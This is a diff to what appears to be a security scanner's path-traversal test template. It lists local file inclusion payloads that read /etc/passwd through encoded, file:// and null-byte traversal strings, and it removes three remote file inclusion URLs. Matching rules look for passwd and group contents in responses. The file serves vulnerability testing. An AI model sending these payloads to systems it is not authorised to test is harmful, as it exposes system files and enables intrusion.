@@ -1,6 +1,5 @@
 generate:
   - payload:
-    # LFI
     - /etc/passwd
     - /%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd/
     - /../../../../../../../../../etc/passwd
@@ -11,12 +10,6 @@ generate:
     - 'file:///etc/passwd'
     - 'file:///../../../../../../../../../etc/passwd'
     - 'file:///../../../../../../../../../etc/passwd\x00'
-
-    # RFI
-    - 'http://wallarm.tools/rfi'
-    - 'http://wallarm.tools/rfi.php'
-    - 'http://wallarm.tools/rfi_location.php'
-
   - method:
     - replace
 
@@ -24,7 +17,6 @@ detect:
   - response:
     - body: 'cm9vdDp4OjA6Cm' #part of base64 < /etc/group
     - body: '(root:x:)|(/bin/bash)|(/usr/sbin/nologin)'
-    - body: 'WLRM-RFI-TEST'
 
 meta-info:
   - type: ptrav
